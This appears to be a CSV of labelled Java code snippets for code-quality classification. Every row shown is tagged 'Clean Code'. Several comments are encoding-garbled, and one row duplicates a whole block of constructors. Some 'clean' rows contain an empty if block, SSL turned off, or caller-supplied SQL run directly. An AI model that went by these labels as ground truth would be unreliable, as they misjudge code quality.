text,label,text_label
"/** 
 * Generates a pairing secret. This should be called before each session. The public key of the card is used as input for the EC-DH algorithm. The output is stored as the secret.
 * @param pubkeyData the public key returned by the applet as response to the SELECT command
 */
public void initiateSecureChannel(byte[] pubkeyData){
  try {
    byte[] privkeyData=this.eckey.getPrivKeyBytes();
    secretPoint=new SecretPoint(privkeyData,pubkeyData);
    secret=secretPoint.ECDHSecretAsBytes();
    byte[] msg_key=""sc_key"".getBytes();
    byte[] derived_key_2Ob=getHmacSha1Hash(secret,msg_key);
    derived_key=new byte[16];
    System.arraycopy(derived_key_2Ob,0,derived_key,0,16);
    byte[] msg_mac=""sc_mac"".getBytes();
    mac_key=getHmacSha1Hash(secret,msg_mac);
    ivCounter=1;
    initialized_secure_channel=true;
  }
 catch (  Exception e) {
    log.error(""Error initiating secure channel"",e);
  }
}",0,Clean Code
"/** 
 * Creates a new callback with default priority.
 * @hide
 */
@SuppressWarnings(""deprecation"") public XC_InitPackageResources(){
  super();
}
/** 
 * Creates a new callback with a specific priority.
 * @param priority See {@link XCallback#priority}.
 * @hide
 */
public XC_InitPackageResources(int priority){
  super(priority);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(scene);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(lineup);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueInfo);
  }
  return size;
}",0,Clean Code
"private void toggleStickerSetInternal(Context context,int toggle,BaseFragment baseFragment,boolean showSettings,TLObject stickerSetObject,TLRPC.StickerSet stickerSet,int type,boolean showTooltip){
  TLRPC.TL_inputStickerSetID stickerSetID=new TLRPC.TL_inputStickerSetID();
  stickerSetID.access_hash=stickerSet.access_hash;
  stickerSetID.id=stickerSet.id;
  if (toggle != 0) {
    TLRPC.TL_messages_installStickerSet req=new TLRPC.TL_messages_installStickerSet();
    req.stickerset=stickerSetID;
    req.archived=toggle == 1;
    markSetInstalling(stickerSet.id,true);
    getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      removingStickerSetsUndos.remove(stickerSet.id);
      if (response instanceof TLRPC.TL_messages_stickerSetInstallResultArchive) {
        processStickerSetInstallResultArchive(baseFragment,showSettings,type,(TLRPC.TL_messages_stickerSetInstallResultArchive)response);
      }
      loadStickers(type,false,false,true,p -> {
        markSetInstalling(stickerSet.id,false);
      }
);
      if (error == null && showTooltip && baseFragment != null) {
        Bulletin.make(baseFragment,new StickerSetBulletinLayout(context,stickerSetObject,StickerSetBulletinLayout.TYPE_ADDED,null,baseFragment.getResourceProvider()),Bulletin.DURATION_SHORT).show();
      }
    }
));
  }
 else {
    markSetUninstalling(stickerSet.id,true);
    TLRPC.TL_messages_uninstallStickerSet req=new TLRPC.TL_messages_uninstallStickerSet();
    req.stickerset=stickerSetID;
    getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      removingStickerSetsUndos.remove(stickerSet.id);
      loadStickers(type,false,true,false,p -> {
        markSetUninstalling(stickerSet.id,false);
      }
);
    }
));
  }
}",0,Clean Code
"/** 
 * 鑾峰彇鍗曚釜鏂囦欢
 * @param batchId batchId
 * @return data
 */
@Override public FileEntity queryOneByBatchId(String batchId){
  FileEntity entity=null;
  AdminFile adminFile=lambdaQuery().eq(AdminFile::getBatchId,batchId).last(""limit 1"").one();
  if (adminFile != null) {
    entity=new FileEntity();
    entity.setIsPublic(adminFile.getIsPublic().toString());
    entity.setPath(adminFile.getPath());
    entity.setFileId(adminFile.getFileId().toString());
    entity.setName(adminFile.getName());
    entity.setCreateTime(adminFile.getCreateTime());
    entity.setCreateUserName(UserCacheUtil.getUserName(adminFile.getCreateUserId()));
    entity.setSize(adminFile.getSize());
    entity.setFileType(adminFile.getFileType());
    entity.setBatchId(adminFile.getBatchId());
  }
  return entity;
}",0,Clean Code
"public static List<Map<String,Object>> run(MysqlContent mysqlContent) throws Exception {
  HttpResponse<String> response=Requests.get(""http://prod-dataops-pmdb.sreworks-dataops/datasource/getDatasourceById?id="" + mysqlContent.getDatasourceId(),null,null);
  Requests.checkResponseStatus(response);
  JSONObject connectConfig=JSONObject.parseObject(response.body()).getJSONObject(""data"").getJSONObject(""connectConfig"");
  String host=connectConfig.getString(""host"");
  int port=connectConfig.getIntValue(""port"");
  String db=connectConfig.getString(""db"");
  String username=connectConfig.getString(""username"");
  String password=connectConfig.getString(""password"");
  Connection con=null;
  ResultSet rs=null;
  String driver=""com.mysql.cj.jdbc.Driver"";
  String url=String.format(""jdbc:mysql://%s:%s/%s?useUnicode=true&characterEncoding=utf-8&useSSL=false"",host,port,db);
  Class.forName(driver);
  try {
    con=DriverManager.getConnection(url,username,password);
    Statement statement=con.createStatement();
    rs=statement.executeQuery(mysqlContent.getSql());
    return get(rs);
  }
  finally {
    if (rs != null) {
      rs.close();
    }
    if (con != null) {
      con.close();
    }
  }
}",0,Clean Code
"private void init(Context context,AttributeSet attrs){
  init(context);
  MessageInputStyle style=MessageInputStyle.parse(context,attrs);
  this.messageInput.setMaxLines(style.getInputMaxLines());
  this.messageInput.setHint(style.getInputHint());
  this.messageInput.setText(style.getInputText());
  this.messageInput.setTextSize(TypedValue.COMPLEX_UNIT_PX,style.getInputTextSize());
  this.messageInput.setTextColor(style.getInputTextColor());
  this.messageInput.setHintTextColor(style.getInputHintColor());
  ViewCompat.setBackground(this.messageInput,style.getInputBackground());
  setCursor(style.getInputCursorDrawable());
  this.attachmentButton.setVisibility(style.showAttachmentButton() ? VISIBLE : GONE);
  this.attachmentButton.setImageDrawable(style.getAttachmentButtonIcon());
  this.attachmentButton.getLayoutParams().width=style.getAttachmentButtonWidth();
  this.attachmentButton.getLayoutParams().height=style.getAttachmentButtonHeight();
  ViewCompat.setBackground(this.attachmentButton,style.getAttachmentButtonBackground());
  this.attachmentButtonSpace.setVisibility(style.showAttachmentButton() ? VISIBLE : GONE);
  this.attachmentButtonSpace.getLayoutParams().width=style.getAttachmentButtonMargin();
  this.messageSendButton.setImageDrawable(style.getInputButtonIcon());
  this.messageSendButton.getLayoutParams().width=style.getInputButtonWidth();
  this.messageSendButton.getLayoutParams().height=style.getInputButtonHeight();
  ViewCompat.setBackground(messageSendButton,style.getInputButtonBackground());
  this.sendButtonSpace.getLayoutParams().width=style.getInputButtonMargin();
  if (getPaddingLeft() == 0 && getPaddingRight() == 0 && getPaddingTop() == 0 && getPaddingBottom() == 0) {
    setPadding(style.getInputDefaultPaddingLeft(),style.getInputDefaultPaddingTop(),style.getInputDefaultPaddingRight(),style.getInputDefaultPaddingBottom());
  }
  this.delayTypingStatusMillis=style.getDelayTypingStatus();
}
private void init(Context context){
  inflate(context,R.layout.view_message_input,this);
  messageInput=findViewById(R.id.messageInput);
  messageSendButton=findViewById(R.id.messageSendButton);
  attachmentButton=findViewById(R.id.attachmentButton);
  sendButtonSpace=findViewById(R.id.sendButtonSpace);
  attachmentButtonSpace=findViewById(R.id.attachmentButtonSpace);
  messageSendButton.setOnClickListener(this);
  attachmentButton.setOnClickListener(this);
  messageInput.addTextChangedListener(this);
  messageInput.setText("""");
  messageInput.setOnFocusChangeListener(this);
}",0,Clean Code
"@Nullable @Override public Authentication convert(HttpServletRequest request){
  String header=request.getHeader(HttpHeaders.AUTHORIZATION);
  if (header == null) {
    return null;
  }
  String[] parts=header.split(""\\s"");
  if (!parts[0].equalsIgnoreCase(""Basic"")) {
    return null;
  }
  if (parts.length != 2) {
    throw new OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_REQUEST);
  }
  byte[] decodedCredentials;
  try {
    decodedCredentials=Base64.getDecoder().decode(parts[1].getBytes(StandardCharsets.UTF_8));
  }
 catch (  IllegalArgumentException ex) {
    throw new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodes.INVALID_REQUEST),ex);
  }
  String credentialsString=new String(decodedCredentials,StandardCharsets.UTF_8);
  String[] credentials=credentialsString.split("":"",2);
  if (credentials.length != 2 || !StringUtils.hasText(credentials[0]) || !StringUtils.hasText(credentials[1])) {
    throw new OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_REQUEST);
  }
  String clientID;
  String clientSecret;
  try {
    clientID=URLDecoder.decode(credentials[0],StandardCharsets.UTF_8.name());
    clientSecret=URLDecoder.decode(credentials[1],StandardCharsets.UTF_8.name());
  }
 catch (  Exception ex) {
    throw new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodes.INVALID_REQUEST),ex);
  }
  return new OAuth2ClientAuthenticationToken(clientID,ClientAuthenticationMethod.CLIENT_SECRET_BASIC,clientSecret,OAuth2EndpointUtils.getParametersIfMatchesAuthorizationCodeGrantRequest(request));
}",0,Clean Code
"public static String getMetaName(String tableName){
  if (StringUtils.isBlank(tableName)) {
    return tableName;
  }
  if (tableName.startsWith(""`"") && tableName.endsWith(""`"")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  if (tableName.startsWith(""\"""") && tableName.endsWith(""\"""")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  if (tableName.startsWith(""'"") && tableName.endsWith(""'"")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  if (tableName.startsWith(""["") && tableName.endsWith(""]"")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  return tableName;
}",0,Clean Code
"@NonNull public static String formatGid(int gid){
  int appid=gid % AID_USER_OFFSET;
  int userid=gid / AID_USER_OFFSET;
  if (appid >= AID_ISOLATED_START) {
    return String.format(Locale.ROOT,""u%d_i%d"",userid,appid - AID_ISOLATED_START);
  }
 else   if (userid == 0 && appid >= AID_SHARED_GID_START && appid <= AID_SHARED_GID_END) {
    return String.format(Locale.ROOT,""all_a%d"",appid - AID_SHARED_GID_START);
  }
 else   if (appid >= AID_EXT_CACHE_GID_START && appid <= AID_EXT_CACHE_GID_END) {
    return String.format(Locale.ROOT,""u%d_a%d_ext_cache"",userid,appid - AID_EXT_CACHE_GID_START);
  }
 else   if (appid >= AID_EXT_GID_START && appid <= AID_EXT_GID_END) {
    return String.format(Locale.ROOT,""u%d_a%d_ext"",userid,appid - AID_EXT_GID_START);
  }
 else   if (appid >= AID_CACHE_GID_START && appid <= AID_CACHE_GID_END) {
    return String.format(Locale.ROOT,""u%d_a%d_cache"",userid,appid - AID_CACHE_GID_START);
  }
 else   if (appid < AID_APP_START) {
    return String.valueOf(gid);
  }
 else {
    return String.format(Locale.ROOT,""u%d_a%d"",userid,appid - AID_APP_START);
  }
}",0,Clean Code
"private void signIn(){
  if (mSigningIn) {
    return;
  }
  Context context=getEHContext();
  MainActivity activity=getActivity2();
  if (null == context || null == activity || null == mUsername || null == mPassword || null == mUsernameLayout || null == mPasswordLayout) {
    return;
  }
  String username=mUsername.getText().toString();
  String password=mPassword.getText().toString();
  if (username.isEmpty()) {
    mUsernameLayout.setError(getString(R.string.error_username_cannot_empty));
    return;
  }
 else {
    mUsernameLayout.setError(null);
  }
  if (password.isEmpty()) {
    mPasswordLayout.setError(getString(R.string.error_password_cannot_empty));
    return;
  }
 else {
    mPasswordLayout.setError(null);
  }
  hideSoftInput();
  showProgress(true);
  EhUtils.signOut(context);
  EhCallback callback=new SignInListener(context,activity.getStageId(),getTag());
  mRequestId=((EhApplication)context.getApplicationContext()).putGlobalStuff(callback);
  EhRequest request=new EhRequest().setMethod(EhClient.METHOD_SIGN_IN).setArgs(username,password).setCallback(callback);
  EhApplication.getEhClient(context).execute(request);
  mSigningIn=true;
}",0,Clean Code
"@Override public List<HrmEmployeeField> downloadExcelFiled(){
  List<HrmEmployeeField> list=employeeFieldService.lambdaQuery().eq(HrmEmployeeField::getIsImportField,1).eq(HrmEmployeeField::getIsHidden,0).list();
  for (  HrmEmployeeField hrmEmployeeField : list) {
    if (""channel_id"".equals(hrmEmployeeField.getFieldName())) {
      List<HrmRecruitChannel> channelList=recruitChannelService.lambdaQuery().eq(HrmRecruitChannel::getStatus,1).list();
      List<Map<String,Object>> mapList=new ArrayList<>();
      for (      HrmRecruitChannel channel : channelList) {
        Map<String,Object> map=new HashMap<>();
        map.put(""name"",channel.getValue());
        mapList.add(map);
      }
      hrmEmployeeField.setOptions(JSON.toJSONString(mapList));
    }
  }
  return list.stream().sorted(Comparator.comparingInt(HrmEmployeeField::getSorting)).sorted(Comparator.comparingInt(HrmEmployeeField::getLabel)).collect(Collectors.toList());
}",0,Clean Code
"/** 
 * 鏇存柊 K8s Microservice (鏅)
 */
@Override public K8sMicroServiceMetaDTO update(K8sMicroServiceMetaUpdateReq request){
  K8sMicroserviceMetaQueryCondition condition=K8sMicroserviceMetaQueryCondition.builder().appId(request.getAppId()).microServiceId(request.getMicroServiceId()).arch(request.getArch()).namespaceId(request.getNamespaceId()).stageId(request.getStageId()).withBlobs(true).build();
  K8sMicroServiceMetaDO dbMeta=k8SMicroserviceMetaService.get(condition);
  if (dbMeta == null) {
    throw new AppException(AppErrorCode.INVALID_USER_ARGS,String.format(""cannot find k8s microservice meta|condition=%s"",JSONObject.toJSONString(condition)));
  }
  K8sMicroServiceMetaDTO dto=new K8sMicroServiceMetaDTO();
  ClassUtil.copy(request,dto);
  if (dto.getImagePushObject() == null) {
    log.warn(""invalid image push object from request|request={}|dto={}"",JSONObject.toJSONString(request),JSONObject.toJSONString(dto));
    dto.setImagePushObject(k8sMicroServiceMetaDtoConvert.to(dbMeta).getImagePushObject());
  }
  return update(dto);
}
/** 
 * 鏇存柊 K8s Microservice (蹇)
 */
@Override public K8sMicroServiceMetaDTO update(K8sMicroServiceMetaQuickUpdateReq request){
  K8sMicroServiceMetaDTO dto=new K8sMicroServiceMetaDTO();
  ClassUtil.copy(request,dto);
  return update(dto);
}
/** 
 * 鏇存柊 K8S Microservice
 * @param dto K8S Microservice DTO 瀵硅薄
 * @return K8s Microservice DTO 瀵硅薄
 */
@Override @Transactional(rollbackFor=Exception.class) public K8sMicroServiceMetaDTO update(K8sMicroServiceMetaDTO dto){
  K8sMicroServiceMetaDO meta=k8sMicroServiceMetaDtoConvert.from(dto);
  K8sMicroserviceMetaQueryCondition condition=K8sMicroserviceMetaQueryCondition.builder().appId(dto.getAppId()).namespaceId(dto.getNamespaceId()).stageId(dto.getStageId()).microServiceId(dto.getMicroServiceId()).arch(dto.getArch()).withBlobs(true).build();
  k8SMicroserviceMetaService.update(meta,condition);
  if (!deployConfigService.hasEnvBinding(DeployConfigHasEnvBindingReq.builder().apiVersion(DefaultConstant.API_VERSION_V1_ALPHA2).appId(dto.getAppId()).isolateNamespaceId(dto.getNamespaceId()).isolateStageId(dto.getStageId()).build())) {
    if (EnvUtil.isSreworks()) {
      refreshDeployConfigForSreworks(dto);
    }
 else {
      refreshDeployConfig(dto);
    }
  }
  return k8sMicroServiceMetaDtoConvert.to(k8SMicroserviceMetaService.get(condition));
}",0,Clean Code
"protected Criterion(String condition){
  super();
  this.condition=condition;
  this.typeHandler=null;
  this.noValue=true;
}
protected Criterion(String condition,Object value,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.typeHandler=typeHandler;
  if (value instanceof List<?>) {
    this.listValue=true;
  }
 else {
    this.singleValue=true;
  }
}
protected Criterion(String condition,Object value){
  this(condition,value,null);
}
protected Criterion(String condition,Object value,Object secondValue,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.secondValue=secondValue;
  this.typeHandler=typeHandler;
  this.betweenValue=true;
}
protected Criterion(String condition,Object value,Object secondValue){
  this(condition,value,secondValue,null);
}
protected Criterion(String condition){
  super();
  this.condition=condition;
  this.typeHandler=null;
  this.noValue=true;
}
protected Criterion(String condition,Object value,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.typeHandler=typeHandler;
  if (value instanceof List<?>) {
    this.listValue=true;
  }
 else {
    this.singleValue=true;
  }
}
protected Criterion(String condition,Object value){
  this(condition,value,null);
}
protected Criterion(String condition,Object value,Object secondValue,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.secondValue=secondValue;
  this.typeHandler=typeHandler;
  this.betweenValue=true;
}
protected Criterion(String condition,Object value,Object secondValue){
  this(condition,value,secondValue,null);
}
",0,Clean Code
"/** 
 * 鏇存柊搴楅摵
 * @param result
 */
@Override protected void processUpdateInternal(CanalBinLogResult<ShopDetailBO> result){
  ShopDetailBO beforeData=result.getBeforeData();
  if (Objects.isNull(beforeData.getShopName()) && StrUtil.isBlank(beforeData.getShopLogo()) && !Objects.equals(beforeData.getShopStatus(),StatusEnum.ENABLE.value())) {
    return;
  }
  ShopDetailBO afterData=result.getAfterData();
  EsProductBO esProductBO=new EsProductBO();
  if (StrUtil.isNotBlank(beforeData.getShopName())) {
    esProductBO.setShopName(afterData.getShopName());
  }
  if (Objects.nonNull(beforeData.getShopLogo())) {
    esProductBO.setShopImg(afterData.getShopLogo());
  }
  if (Objects.nonNull(beforeData.getShopStatus()) && Objects.equals(beforeData.getShopId(),StatusEnum.ENABLE.value())) {
    esProductBO.setSpuStatus(StatusEnum.DISABLE.value());
  }
  ServerResponseEntity<List<Long>> responseData=productFeignClient.getSpuIdsByShopId(afterData.getShopId());
  productUpdateManager.esUpdateSpuBySpuIds(responseData.getData(),esProductBO);
}
",0,Clean Code
"public void removePendingStream(Video video){
  if (video == null || video.videoId == null || !containsPendingStream(video)) {
    return;
  }
  Helpers.removeIf(mPendingStreams,item -> video.videoId.equals(item.videoId));
  persistState();
}
",0,Clean Code
"@Override public Map<String,Object> getConditionMap(Integer label,Integer typeId,Integer recordId){
  ExamineRecord record=examineRecordService.getById(recordId);
  if (record == null) {
    log.error(""娌℃湁鎵惧埌瀵瑰簲鐨勫鏍歌褰曪紒鏌ユ壘鐨勮褰昳d涓簕}"",recordId);
    return new HashMap<>(2);
  }
  ExamineConditionDataBO examineConditionDataBO=new ExamineConditionDataBO();
  examineConditionDataBO.setLabel(label);
  examineConditionDataBO.setTypeId(typeId);
  Long examineId=record.getExamineId();
  examineConditionDataBO.setCategoryId(examineId.intValue());
  List<String> fieldList=new ArrayList<>();
  List<ExamineFlowConditionDataVO> conditionDataVoS=examineService.previewFiledName(label,recordId,null);
  if (conditionDataVoS != null) {
    fieldList=conditionDataVoS.stream().map(ExamineFlowConditionDataVO::getFieldName).collect(Collectors.toList());
    fieldList.removeIf(StrUtil::isEmpty);
  }
  examineConditionDataBO.setFieldList(fieldList);
  return oaService.getDataMapForNewExamine(examineConditionDataBO).getData();
}",0,Clean Code
"@EventHandler private void onEntityAdded(EntityAddedEvent event){
  if (!(event.entity instanceof EndCrystalEntity))   return;
  if (placing && event.entity.getBlockPos().equals(placingCrystalBlockPos)) {
    placing=false;
    placingTimer=0;
    placedCrystals.add(event.entity.getId());
  }
  if (fastBreak.get() && !didRotateThisTick && attacks < attackFrequency.get()) {
    float damage=getBreakDamage(event.entity,true);
    if (damage > minDamage.get())     doBreak(event.entity);
  }
}",0,Clean Code
"@PostConstruct public void init() throws IOException {
  String path=""/app/client-deploy-packages"";
  File file=new File(path);
  File[] fs=file.listFiles();
  for (  File pkg : fs) {
    if (!pkg.isDirectory()) {
      continue;
    }
    File clientFile=new File(pkg.getAbsolutePath() + ""/client.yaml"");
    if (!clientFile.exists()) {
      continue;
    }
    Yaml yaml=SchemaUtil.createYaml();
    String content=FileUtils.readFileToString(clientFile,StandardCharsets.UTF_8);
    JSONObject clientInfo=yaml.loadAs(content,JSONObject.class);
    packages.put(pkg.getName(),clientInfo);
  }
}",0,Clean Code
"/** 
 * 鍒犻櫎鏁版嵁
 * @param ids ids
 */
@Override @Transactional(rollbackFor=Exception.class) public void deleteByIds(List<Integer> ids){
  LambdaQueryWrapper<CrmProduct> wrapper=new LambdaQueryWrapper<>();
  wrapper.select(CrmProduct::getBatchId);
  wrapper.in(CrmProduct::getProductId,ids);
  List<String> batchIdList=listObjs(wrapper,Object::toString);
  crmActionRecordService.deleteActionRecord(CrmEnum.PRODUCT,ids);
  if (CollUtil.isNotEmpty(batchIdList)) {
  }
  LambdaUpdateWrapper<CrmProduct> updateWrapper=new LambdaUpdateWrapper<>();
  updateWrapper.set(CrmProduct::getStatus,3);
  updateWrapper.in(CrmProduct::getProductId,ids);
  update(updateWrapper);
  deletePage(ids);
}",0,Clean Code
"/** 
 * Unescapes  {@code data} up to the specified limit, replacing occurrences of [0, 0, 3] with[0, 0]. The unescaped data is returned in-place, with the return value indicating its length. <p> Executions of this method are mutually exclusive, so it should not be called with very large buffers.
 * @param data The data to unescape.
 * @param limit The limit (exclusive) of the data to unescape.
 * @return The length of the unescaped data.
 */
public static int unescapeStream(byte[] data,int limit){
synchronized (scratchEscapePositionsLock) {
    int position=0;
    int scratchEscapeCount=0;
    while (position < limit) {
      position=findNextUnescapeIndex(data,position,limit);
      if (position < limit) {
        if (scratchEscapePositions.length <= scratchEscapeCount) {
          scratchEscapePositions=Arrays.copyOf(scratchEscapePositions,scratchEscapePositions.length * 2);
        }
        scratchEscapePositions[scratchEscapeCount++]=position;
        position+=3;
      }
    }
    int unescapedLength=limit - scratchEscapeCount;
    int escapedPosition=0;
    int unescapedPosition=0;
    for (int i=0; i < scratchEscapeCount; i++) {
      int nextEscapePosition=scratchEscapePositions[i];
      int copyLength=nextEscapePosition - escapedPosition;
      System.arraycopy(data,escapedPosition,data,unescapedPosition,copyLength);
      unescapedPosition+=copyLength;
      data[unescapedPosition++]=0;
      data[unescapedPosition++]=0;
      escapedPosition+=copyLength + 3;
    }
    int remainingLength=unescapedLength - unescapedPosition;
    System.arraycopy(data,escapedPosition,data,unescapedPosition,remainingLength);
    return unescapedLength;
  }
}",0,Clean Code
"@Override protected void additionalAuthenticationChecks(UserDetails userDetails,UsernamePasswordAuthenticationToken authentication) throws AuthenticationException {
  AuthorizationUser user;
  if (userDetails instanceof AuthorizationUser) {
    user=(AuthorizationUser)userDetails;
  }
 else {
    logger.debug(""Authentication failed: no credentials provided"");
    throw new AuthException(AuthorizationCodeEnum.AUTHORIZATION_LOGIN_ERR);
  }
  if (authentication.getCredentials() == null) {
    logger.debug(""Authentication failed: no credentials provided"");
    throw new AuthException(AuthorizationCodeEnum.AUTHORIZATION_LOGIN_ERR);
  }
  String presentedPassword=authentication.getCredentials().toString();
  List<UserInfo> userInfoList=user.getUserInfoList();
  if (userInfoList.size() == 0) {
    throw new AuthException(AuthorizationCodeEnum.AUTHORIZATION_LOGIN_NO_USER);
  }
  AuthorizationUserInfo userDetailsInfo=new AuthorizationUserInfo();
  userInfoList.forEach(userInfo -> {
    AuthorizationUser authorizationUser=AuthorizationUser.toAuthorizationUser(userInfo);
    if (passwordEncoder.matches(presentedPassword,authorizationUser.toJSON())) {
      userDetailsInfo.addAuthorizationUser(authorizationUser);
    }
  }
);
  authentication.setDetails(userDetailsInfo);
}",0,Clean Code
"public static int changeColorAccent(ThemeInfo themeInfo,int accent,int color){
  if (accent == 0 || themeInfo.accentBaseColor == 0 || accent == themeInfo.accentBaseColor || themeInfo.firstAccentIsDefault && themeInfo.currentAccentId == DEFALT_THEME_ACCENT_ID) {
    return color;
  }
  float[] hsvTemp3=getTempHsv(3);
  float[] hsvTemp4=getTempHsv(4);
  Color.colorToHSV(themeInfo.accentBaseColor,hsvTemp3);
  Color.colorToHSV(accent,hsvTemp4);
  return changeColorAccent(hsvTemp3,hsvTemp4,color,themeInfo.isDark());
}
public static int changeColorAccent(int color){
  ThemeAccent accent=currentTheme.getAccent(false);
  return changeColorAccent(currentTheme,accent != null ? accent.accentColor : 0,color);
}
public static int changeColorAccent(float[] baseHsv,float[] accentHsv,int color,boolean isDarkTheme){
  if (tmpHSV5 == null) {
    tmpHSV5=new float[3];
  }
  float[] colorHsv=tmpHSV5;
  Color.colorToHSV(color,colorHsv);
  final float diffH=Math.min(abs(colorHsv[0] - baseHsv[0]),abs(colorHsv[0] - baseHsv[0] - 360f));
  if (diffH > 30f) {
    return color;
  }
  float dist=Math.min(1.5f * colorHsv[1] / baseHsv[1],1f);
  colorHsv[0]=colorHsv[0] + accentHsv[0] - baseHsv[0];
  colorHsv[1]=colorHsv[1] * accentHsv[1] / baseHsv[1];
  colorHsv[2]=colorHsv[2] * (1f - dist + dist * accentHsv[2] / baseHsv[2]);
  int newColor=Color.HSVToColor(Color.alpha(color),colorHsv);
  float origBrightness=AndroidUtilities.computePerceivedBrightness(color);
  float newBrightness=AndroidUtilities.computePerceivedBrightness(newColor);
  boolean needRevertBrightness=isDarkTheme ? origBrightness > newBrightness : origBrightness < newBrightness;
  if (needRevertBrightness) {
    float amountOfNew=0.6f;
    float fallbackAmount=(1f - amountOfNew) * origBrightness / newBrightness + amountOfNew;
    newColor=changeBrightness(newColor,fallbackAmount);
  }
  return newColor;
}",0,Clean Code
"private void findAllPrivateMembers(Class<?> cls){
  Field[] fields=cls.getDeclaredFields();
  for (  Field f : fields) {
    if (Modifier.isFinal(f.getModifiers()) || Modifier.isPrivate(f.getModifiers()) || Modifier.isProtected(f.getModifiers())) {
      memberRecord.privateOrFinalFields.add(f.getName());
    }
 else {
      memberRecord.nonPrivateNorFinalFields.add(f.getName());
    }
  }
  Method[] methods=cls.getDeclaredMethods();
  for (  final Method m : methods) {
    if (Modifier.isPrivate(m.getModifiers()) || Modifier.isProtected(m.getModifiers())) {
      checkAndAdd(memberRecord.privateMethods,m.getName(),getParameterLength(m));
    }
 else {
      checkAndAdd(memberRecord.nonPrivateMethods,m.getName(),getParameterLength(m));
    }
  }
  if (cls.getSuperclass() != null) {
    findAllPrivateMembers(cls.getSuperclass());
  }
}
",0,Clean Code
"private void scheduleCompaction(HoodieFlinkTable<?> table,long checkpointId) throws IOException {
  Option<HoodieInstant> firstRequested=table.getActiveTimeline().filterPendingCompactionTimeline().filter(instant -> instant.getState() == HoodieInstant.State.REQUESTED).firstInstant();
  if (!firstRequested.isPresent()) {
    LOG.info(""No compaction plan for checkpoint "" + checkpointId);
    return;
  }
  String compactionInstantTime=firstRequested.get().getTimestamp();
  HoodieCompactionPlan compactionPlan=CompactionUtils.getCompactionPlan(table.getMetaClient(),compactionInstantTime);
  if (compactionPlan == null || (compactionPlan.getOperations() == null) || (compactionPlan.getOperations().isEmpty())) {
    LOG.info(""Empty compaction plan for instant "" + compactionInstantTime);
  }
 else {
    HoodieInstant instant=HoodieTimeline.getCompactionRequestedInstant(compactionInstantTime);
    table.getActiveTimeline().transitionCompactionRequestedToInflight(instant);
    table.getMetaClient().reloadActiveTimeline();
    List<CompactionOperation> operations=compactionPlan.getOperations().stream().map(CompactionOperation::convertFromAvroRecordInstance).collect(toList());
    LOG.info(""Execute compaction plan for instant {} as {} file groups"",compactionInstantTime,operations.size());
    WriteMarkersFactory.get(table.getConfig().getMarkersType(),table,compactionInstantTime).deleteMarkerDir(table.getContext(),table.getConfig().getMarkersDeleteParallelism());
    for (    CompactionOperation operation : operations) {
      output.collect(new StreamRecord<>(new CompactionPlanEvent(compactionInstantTime,operation)));
    }
  }
}
",0,Clean Code
